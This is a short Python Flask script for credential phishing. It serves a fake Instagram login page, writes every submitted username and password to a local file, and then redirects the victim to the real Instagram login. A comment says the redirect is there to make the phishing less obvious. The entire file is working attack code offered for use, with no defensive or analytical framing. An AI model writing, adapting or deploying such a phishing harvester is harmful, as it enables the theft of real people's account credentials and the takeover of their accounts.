from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Route to serve the fake Instagram login page
@app.route('/')
def index():
    # Flask will automatically look for 'fake_instagram.html' inside the 'templates' folder
    return render_template('insta.html')

# Route to handle form submission and capture credentials
@app.route('/capture', methods=['POST'])
def capture():
    username = request.form['username']
    password = request.form['password']

    # Save captured credentials to a file
    # The file will be created in the same directory where app.py is running
    with open('captured_credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    # Redirect to the real Instagram to make the phishing less obvious
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    # Use host='0.0.0.0' to make it accessible on your local network
    app.run(host='0.0.0.0', port=5000, debug=True)